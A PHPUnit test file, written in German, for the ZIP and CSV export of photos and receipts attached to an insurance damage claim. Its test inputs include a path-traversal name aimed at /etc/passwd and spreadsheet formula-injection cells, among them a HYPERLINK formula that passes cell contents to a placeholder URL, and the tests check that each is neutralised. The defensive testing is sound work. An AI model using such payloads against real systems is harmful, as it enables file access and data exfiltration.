<?php

namespace Tests;

use PHPUnit\Framework\TestCase;
use ZipArchive;

require_once __DIR__ . '/../helpers_schadenfall_zip.php';

/**
 * Fotos und Belege zum Schadensfall als ZIP (helpers_schadenfall_zip.php, 4.4.1).
 *
 * Die Namen kommen aus Benutzereingaben (Gegenstandsname, Originalname der
 * hochgeladenen Rechnung) - genau dort entstehen Pfade mit "../", doppelte
 * Namen und Zeichen, die Windows beim Entpacken ablehnt.
 */
class SchadenfallZipTest extends TestCase
{
    private string $dir;

    protected function setUp(): void
    {
        $this->dir = sys_get_temp_dir() . '/vszip_' . bin2hex(random_bytes(4));
        mkdir($this->dir);
    }

    protected function tearDown(): void
    {
        foreach (glob($this->dir . '/*') ?: [] as $f) {
            unlink($f);
        }
        rmdir($this->dir);
    }

    private function datei(string $name, string $inhalt = 'x'): string
    {
        $p = $this->dir . '/' . $name;
        file_put_contents($p, $inhalt);
        return $p;
    }

    public function testTeilEntferntPfadUndVerboteneZeichen(): void
    {
        // kein Schraegstrich mehr, fuehrende Punkte weg (keine versteckte Datei)
        $this->assertSame('_.._etc_passwd', vsZipTeil('../../etc/passwd'));
        $this->assertStringNotContainsString('/', vsZipTeil('a/../../b'));
        $this->assertSame('Rechnung_ 2024_ _Kopie_', vsZipTeil('Rechnung: 2024? "Kopie"'));
        $this->assertSame('Ölgemälde Herbst', vsZipTeil("  Ölgemälde\tHerbst. "));
        $this->assertSame('datei', vsZipTeil(" . "));
        $this->assertSame('beleg', vsZipTeil("\x01\x02", 60, 'beleg'));
    }

    public function testTeilKuerztUndBehaeltEndung(): void
    {
        $lang = str_repeat('Ä', 100) . '.pdf';
        $kurz = vsZipTeil($lang, 20);
        $this->assertSame(20, mb_strlen($kurz, 'UTF-8'));
        $this->assertStringEndsWith('.pdf', $kurz);
    }

    public function testEindeutigZaehltOhneGrossKlein(): void
    {
        $belegt = [];
        $this->assertSame('Rechnung.pdf', vsZipEindeutig('Rechnung.pdf', $belegt));
        $this->assertSame('rechnung (2).pdf', vsZipEindeutig('rechnung.pdf', $belegt));
        $this->assertSame('Rechnung (3).pdf', vsZipEindeutig('Rechnung.pdf', $belegt));
        $this->assertSame('ohne_endung', vsZipEindeutig('ohne_endung', $belegt));
        $this->assertSame('ohne_endung (2)', vsZipEindeutig('ohne_endung', $belegt));
    }

    public function testInhaltOrdnerFotosBelege(): void
    {
        $f1 = $this->datei('a.jpg', '11');
        $f2 = $this->datei('b.jpg', '222');
        $b1 = $this->datei('r1.pdf', '4444');
        $b2 = $this->datei('r2.pdf', '55555');
        $gegenstaende = [
            ['id' => 7, 'name' => 'Flügel / akustisch'],
            ['id' => 9, 'name' => 'Ring'],
        ];
        $fotos = [7 => [$f1, $f2, $this->dir . '/fehlt.jpg'], 9 => []];
        $belege = [7 => [['pfad' => $b1, 'name' => 'Rechnung.pdf'], ['pfad' => $b2, 'name' => 'rechnung.PDF']], 9 => []];

        $r = vsSchadenfallZipInhalt($gegenstaende, fn($g) => $fotos[$g['id']], fn($g) => $belege[$g['id']],
                                    true, 'Fotos', 'Belege');

        $this->assertSame([
            '01_Flügel _ akustisch/Fotos/1.jpg'               => $f1,
            '01_Flügel _ akustisch/Fotos/2.jpg'               => $f2,
            '01_Flügel _ akustisch/Belege/Rechnung.pdf'       => $b1,
            '01_Flügel _ akustisch/Belege/rechnung (2).PDF'   => $b2,
        ], $r['dateien']);
        $this->assertSame(2 + 3 + 4 + 5, $r['bytes']);
        $this->assertSame(['fotos' => 2, 'belege' => 2, 'ordner' => '01_Flügel _ akustisch'], $r['je'][7]);
        $this->assertSame(['fotos' => 0, 'belege' => 0, 'ordner' => '02_Ring'], $r['je'][9]);
    }

    public function testOhneBelegrechtNurFotos(): void
    {
        $f = $this->datei('a.jpg');
        $b = $this->datei('r.pdf');
        $r = vsSchadenfallZipInhalt([['id' => 1, 'name' => 'Uhr']],
            fn() => [$f], fn() => [['pfad' => $b, 'name' => 'r.pdf']], false, 'Fotos', 'Belege');
        $this->assertSame(['01_Uhr/Fotos/1.jpg' => $f], $r['dateien']);
        $this->assertSame(0, $r['je'][1]['belege']);
    }

    public function testGleicheGegenstandsnamenBekommenNummern(): void
    {
        $f = $this->datei('a.jpg');
        $r = vsSchadenfallZipInhalt([['id' => 1, 'name' => 'Stuhl'], ['id' => 2, 'name' => 'Stuhl']],
            fn() => [$f], fn() => [], true, 'Fotos', 'Belege');
        $this->assertSame(['01_Stuhl', '02_Stuhl'], array_column($r['je'], 'ordner'));
    }

    public function testCsvBomSemikolonUndKeineFormeln(): void
    {
        $csv = vsSchadenfallCsv(['Name', 'Wert'], [['=HYPERLINK("x")', '12,50'], ['Ring; Gold', '-5'], ['Zeile"1', '3']]);
        $this->assertStringStartsWith("\xEF\xBB\xBF", $csv);
        $zeilen = explode("\r\n", substr($csv, 3));
        $this->assertSame('Name;Wert', $zeilen[0]);
        $this->assertSame('"\'=HYPERLINK(""x"")";12,50', $zeilen[1]);
        $this->assertSame('"Ring; Gold";-5', $zeilen[2]);
        $this->assertSame('"Zeile""1";3', $zeilen[3]);
    }

    public function testZipEntpacktMitUmlautnamen(): void
    {
        $f = $this->datei('a.jpg', 'FOTO');
        $r = vsSchadenfallZipInhalt([['id' => 1, 'name' => 'Ölgemälde']], fn() => [$f], fn() => [], true, 'Fotos', 'Belege');
        $zipPfad = $this->dir . '/t.zip';
        $zip = new ZipArchive();
        $this->assertTrue($zip->open($zipPfad, ZipArchive::CREATE | ZipArchive::OVERWRITE));
        foreach ($r['dateien'] as $ziel => $quelle) {
            $zip->addFile($quelle, $ziel);
            $zip->setCompressionName($ziel, ZipArchive::CM_STORE);
        }
        $zip->close();

        $zip->open($zipPfad);
        $this->assertSame('01_Ölgemälde/Fotos/1.jpg', $zip->getNameIndex(0));
        $this->assertSame('FOTO', $zip->getFromIndex(0));
        $zip->close();
    }

    // ── vsCsvFormelSchutz (OWASP-A05-003, 4.6) ─────────────────────────────

    /** @dataProvider csvZellen */
    public function testCsvFormelSchutz(string $ein, string $aus): void
    {
        $this->assertSame($aus, vsCsvFormelSchutz($ein));
    }

    public static function csvZellen(): array
    {
        return [
            'Formel'        => ['=HYPERLINK("https://x?"&A2;"R")', "'=HYPERLINK(\"https://x?\"&A2;\"R\")"],
            'Plus'          => ['+1+1', "'+1+1"],
            'At'            => ['@SUM(A1)', "'@SUM(A1)"],
            'Tab vorne'     => ["\t=1+1", "'\t=1+1"],
            'Minus-Text'    => ['-Rabatt', "'-Rabatt"],
            'negative Zahl' => ['-12.5', '-12.5'],
            'Platzhalter'   => ['-', '-'],
            'normal'        => ['Uhr (Erbstück)', 'Uhr (Erbstück)'],
            'leer'          => ['', ''],
        ];
    }
}
